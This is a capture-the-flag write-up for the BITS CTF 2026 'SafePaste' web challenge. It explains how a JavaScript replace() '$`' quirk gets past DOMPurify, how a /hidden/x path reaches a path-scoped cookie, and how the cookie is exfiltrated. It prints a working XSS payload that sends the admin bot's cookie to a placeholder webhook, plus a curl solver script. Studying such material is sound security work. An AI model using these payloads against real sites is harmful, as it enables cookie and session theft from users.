---
title: "[Web] SafePaste"
description: Writeup for "SafePaste" from BITS CTF 2026.
date: 2026-02-22 01:00:00 +0900
categories: [CTF, BITS CTF 2026]
tags: [Web]
toc: true
comments: false
---

# SafePaste (BITS CTF 2026)

---

- **Name:** SafePaste
- **Category:** Web
- **Description:** Yet another paste challenge?
- **Difficulty:** ★★★☆☆

---

## TL;DR

Four bugs chained together to steal the admin bot's `FLAG` cookie:

1. **mXSS** — `isomorphic-dompurify` passes a payload hidden inside an `id` attribute, which escapes into HTML context via JS `replace()`'s `` $` `` pattern
2. **Socket Destroy Bypass** — `/hidden` destroys the socket on unauthorized access, but `/hidden/x` (a 404 path) loads normally and still has access to `path=/hidden` cookies
3. **Unicode Error Bypass** — the flag contains an emoji (🥀), so `btoa()` throws an error; use `encodeURIComponent()` instead
4. **Domain Match** — the bot only visits URLs matching `APP_HOST`, so report the public IP, not `localhost`

---

## Overview

SafePaste is a classic client-side XSS challenge.

- Users create pastes that are sanitized with DOMPurify and rendered as HTML
- Anyone can report a URL and make the admin bot visit it
- The bot has a `FLAG` cookie set with `path: "/hidden"` and `domain: APP_HOST`

The goal is to steal that cookie — but multiple layers of defense make it non-trivial.

---

## Solution

### 1) Recon

Key endpoints and defenses from the source code:

**`/create` & `/paste/:id`**
User input is sanitized with `isomorphic-dompurify` and rendered as HTML.

**`/report`**
Passes a URL to the admin bot (Puppeteer).
The URL hostname must match `APP_HOST` or `localhost`.

**Bot cookie setup**
```
FLAG cookie: domain=APP_HOST, path="/hidden"
```

**`/hidden` defense**
```typescript
app.get("/hidden", (req, res) => {
  if (req.query.secret === ADMIN_SECRET)
    return res.send("Welcome, admin!");
  res.socket?.destroy(); // forcibly kills the connection
});
```

---

### 2) Root Cause

#### Bug 1 — JS `replace()` `` $` `` pattern (mXSS)

JavaScript's `String.prototype.replace()` treats certain patterns in the replacement string specially:

| Pattern | Meaning |
|---|---|
| `$$` | literal `$` |
| `` $` `` | **everything before the match** |
| `$'` | everything after the match |

The paste template inserts content like this:

```javascript
template.replace("{paste}", content)
```

If `content` is:

```html
<p id="$`<img onerror=XSS>">
```

Then `` $` `` expands to the entire HTML before `{paste}`, which includes a `"` character that **closes the `id` attribute early** — letting `<img onerror=XSS>` escape into HTML context.

DOMPurify allows this because it only sees a harmless `id` attribute value. The injection happens **after** sanitization, during template rendering.

#### Bug 2 — `path=/hidden` cookie access via iframe

The `FLAG` cookie is scoped to `path="/hidden"`.

Directly visiting `/hidden` triggers socket destruction before the page loads.
But `/hidden/x` is a 404 — it returns a normal HTTP response without triggering the destroy logic.

Cookie path matching works like a **prefix**: `/hidden/x` is under `/hidden`, so the cookie is included.
Since it's the same origin, `iframe.contentDocument.cookie` gives us access to `FLAG`.

```
/hidden   → socket.destroy() → iframe onload never fires ❌
/hidden/x → 404, normal response → iframe loads + path=/hidden cookie accessible ✅
```

---

### 3) Exploit

#### Step 1 — Confirm DOMPurify passes the payload

DOMPurify considers content inside `id` attributes safe, so this passes sanitization:

```html
<p id="$`<img src=x onerror=PAYLOAD>">
```

It's stored as-is. The danger only appears when the template renders it.

#### Step 2 — XSS payload to steal the cookie

```javascript
var i = document.createElement('iframe');
i.src = '/hidden/x';
document.body.appendChild(i);
setTimeout(() => {
  var c = i.contentDocument.cookie;
  location.href = 'WEBHOOK?c=' + encodeURIComponent(c);
}, 2000);
```

Note: use `encodeURIComponent()` not `btoa()` — the flag contains an emoji (🥀) which causes `btoa()` to throw `InvalidCharacterError`.

#### Step 3 — Create the malicious paste and report it

```bash
WEBHOOK="https://your-webhook-url"
TARGET_IP="20.193.149.152"

JS="var i=document.createElement('iframe');\
i.src='/hidden/x';\
document.body.appendChild(i);\
setTimeout(()=>{\
var c=i.contentDocument.cookie;\
location.href='${WEBHOOK}?c='+encodeURIComponent(c);\
},2000);"

B64=$(echo -n "$JS" | base64 -w 0)

# Create paste with mXSS payload
PASTE_ID=$(curl -sX POST http://$TARGET_IP:3000/create \
  --data-urlencode \
  "content=<p id=\"\$\`<img src=x onerror=eval(atob(\`${B64}\`))>\">" \
  -D - -o /dev/null \
  | grep -i location | tr -d '\r' \
  | awk '{print $2}' | cut -d'/' -f3)

echo "Paste ID: $PASTE_ID"

# Report to bot using public IP (must match APP_HOST)
curl -sX POST http://$TARGET_IP:3000/report \
  --data-urlencode "url=http://$TARGET_IP:3000/paste/$PASTE_ID"
```

---

### 4) Why it works

Full attack chain:

```
[Attacker]
    │
    ├─ 1. POST /create
    │      DOMPurify passes <p id="$`<img onerror=...>">
    │      (payload hidden inside id attribute)
    │
    ├─ 2. GET /paste/:id
    │      template.replace("{paste}", content)
    │      $` expands → id closes early
    │      → <img onerror=eval(atob(...))> exposed in HTML
    │
    ├─ 3. POST /report
    │      Bot visits the paste URL
    │      XSS executes in admin's browser
    │
    └─ 4. XSS runs:
           iframe loads /hidden/x (404, no socket destroy)
           → path=/hidden cookie accessible
           → FLAG exfiltrated to webhook
```

Each bypass explained:

- **DOMPurify** — payload hidden in `id` value, passes sanitization
- **mXSS** — `` $` `` in JS `replace()` injects template HTML, breaking out of `id`
- **Socket destroy** — use `/hidden/x` (404) instead of `/hidden`
- **Cookie scope** — `/hidden/x` path prefix matches `/hidden` cookie
- **Emoji in flag** — `encodeURIComponent()` handles unicode; `btoa()` would fail
- **Domain check** — report uses public IP matching `APP_HOST`

---

## Solver

```bash
WEBHOOK="https://your-webhook-url"
TARGET_IP="20.193.149.152"

JS="var i=document.createElement('iframe');i.src='/hidden/x';document.body.appendChild(i);setTimeout(()=>{try{var c=i.contentDocument.cookie;location.href='${WEBHOOK}?c='+encodeURIComponent(c);}catch(e){location.href='${WEBHOOK}?e='+encodeURIComponent(e.name);}},2000);"
B64=$(echo -n "$JS" | base64 -w 0)

PASTE_ID=$(curl -sX POST http://$TARGET_IP:3000/create \
  --data-urlencode \
  "content=<p id=\"\$\`<img src=x onerror=eval(atob(\`${B64}\`))>\">" \
  -D - -o /dev/null \
  | grep -i location | tr -d '\r' \
  | awk '{print $2}' | cut -d'/' -f3)

echo "Paste ID: $PASTE_ID"

curl -sX POST http://$TARGET_IP:3000/report \
  --data-urlencode "url=http://$TARGET_IP:3000/paste/$PASTE_ID"
```

---

## Flag

```
BITSCTF{n07_r34lly_4_d0mpur1fy_byp455?_w3b_6uy_51nc3r3ly_4p0l061535_f0r_7h3_pr3v10u5_ch4ll3n635🥀}
```
